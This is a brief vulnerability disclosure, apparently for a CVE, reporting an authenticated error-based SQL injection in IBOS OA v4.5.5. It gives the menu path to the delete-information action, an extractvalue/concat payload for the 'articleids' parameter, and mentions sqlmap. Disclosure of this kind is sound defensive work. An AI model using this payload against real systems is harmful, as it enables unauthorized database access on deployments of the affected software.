SQL injection vulnerability in ibos oa v4.5.5

official website： http://www.ibos.com.cn/

version：4.5.5 

Log in to the background. General Office => Information Bulletin => Release Information => Delete Information => Delete Log Capture Error Injection Successful

![图片5](https://github.com/xiaosed/cve/assets/84080097/e32216ae-6ae2-4bde-8efe-866924b91701)
![图片6](https://github.com/xiaosed/cve/assets/84080097/c48be67e-76d4-445e-b06c-16e7fc8c319c)
![图片7](https://github.com/xiaosed/cve/assets/84080097/097266da-f280-416c-b67f-3ebf585ee5b7)



Payload：articleids=extractvalue(1,concat(char(126),md5(1404461947)))

Sqlmap：

![图片8](https://github.com/xiaosed/cve/assets/84080097/f9003cfd-a237-4729-b830-1389245314cb)

